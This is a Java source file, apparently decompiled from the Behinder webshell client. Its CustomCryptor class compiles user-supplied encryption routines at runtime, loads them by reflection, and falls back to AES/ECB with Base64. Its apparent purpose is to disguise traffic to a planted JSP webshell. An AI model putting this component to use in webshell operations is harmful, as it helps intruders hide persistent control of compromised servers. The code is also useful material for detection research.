package net.rebeyond.behinder.core;

import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.rebeyond.behinder.dao.TransProtocolDao;
import net.rebeyond.behinder.entity.TransProtocol;
import net.rebeyond.behinder.utils.Utils;

public class CustomCryptor extends ClassLoader implements ICrypt {
   private TransProtocolDao transProtocolDao = new TransProtocolDao();
   private TransProtocol transProtocol;
   private TransProtocol localTransProtocol;
   private Map transProtocolMap = new HashMap();
   private String key;
   private Class encodeCls;
   private Class decodeCls;

   public Class getEncodeCls() throws Exception {
      if (this.encodeCls == null) {
         byte[] payload = Utils.getClassFromSourceCode(this.paddingCode(this.localTransProtocol.getEncode()));
         this.encodeCls = (new CustomCryptor()).define(payload);
      }

      return this.encodeCls;
   }

   public Class getDecodeCls() throws Exception {
      if (this.decodeCls == null) {
         byte[] payload = Utils.getClassFromSourceCode(this.paddingCode(this.localTransProtocol.getDecode()));
         this.decodeCls = (new CustomCryptor()).define(payload);
      }

      return this.decodeCls;
   }

   public byte[] getDecodeClsBytes() throws Exception {
      byte[] payload = Utils.getClassFromSourceCode(this.paddingCode(this.localTransProtocol.getDecode()));
      payload[7] = 50;
      return payload;
   }

   public boolean isCustomized() {
      return true;
   }

   public Class define(byte[] bytes) {
      return super.defineClass(bytes, 0, bytes.length);
   }

   public CustomCryptor(int transProtocolId, String key) throws Exception {
      this.transProtocol = this.transProtocolDao.findTransProtocolById(transProtocolId);
      this.key = key;
      List transProtocolList = this.transProtocolDao.findTransProtocolsById(transProtocolId);
      Iterator var4 = transProtocolList.iterator();

      while(var4.hasNext()) {
         TransProtocol transProtocol = (TransProtocol)var4.next();
         this.transProtocolMap.put(transProtocol.getType(), transProtocol);
         if (transProtocol.getType().equals("jsp")) {
            this.localTransProtocol = transProtocol;
         }
      }

      if (!this.verify()) {
      }

   }

   public CustomCryptor() {
   }

   public byte[] encrypt(byte[] clearContent) throws Exception {
      Class encodeCls = this.getEncodeCls();
      Method encodeMethod = encodeCls.getDeclaredMethod("Encrypt", byte[].class);
      encodeMethod.setAccessible(true);
      byte[] result = (byte[])encodeMethod.invoke(encodeCls.newInstance(), clearContent);
      return result;
   }

   public byte[] encryptCompatible(byte[] clearContent) throws Exception {
      byte[] raw = this.key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(clearContent);
      encrypted = Utils.mergeBytes(Base64.getEncoder().encode(encrypted), "\n".getBytes());
      return encrypted;
   }

   public byte[] decryptCompatible(byte[] clearContent) throws Exception {
      clearContent = Base64.getDecoder().decode(clearContent);
      byte[] raw = this.key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(2, skeySpec);
      byte[] decrypted = cipher.doFinal(clearContent);
      return decrypted;
   }

   public byte[] decrypt(byte[] decryptContent) throws Exception {
      Class decodeCls = this.getDecodeCls();
      Method decodeMethod = decodeCls.getDeclaredMethod("Decrypt", byte[].class);
      decodeMethod.setAccessible(true);
      byte[] result = (byte[])decodeMethod.invoke(decodeCls.newInstance(), decryptContent);
      return result;
   }

   public boolean verify() {
      try {
         String clearContent = Utils.getRandomString(20);
         byte[] encryptContent = this.encrypt(clearContent.getBytes());
         byte[] decryptContent = this.decrypt(encryptContent);
         if (Arrays.equals(clearContent.getBytes(), decryptContent)) {
            return true;
         }
      } catch (Exception var4) {
         var4.printStackTrace();
      }

      return false;
   }

   public TransProtocol getTransProtocol(String type) {
      return (TransProtocol)this.transProtocolMap.get(type);
   }

   private String paddingCode(String fuctionCode) {
      return String.format(Constants.JAVA_CODE_TEMPLATE_SHORT, fuctionCode);
   }

   public static void main(String[] args) throws Exception {
   }
}
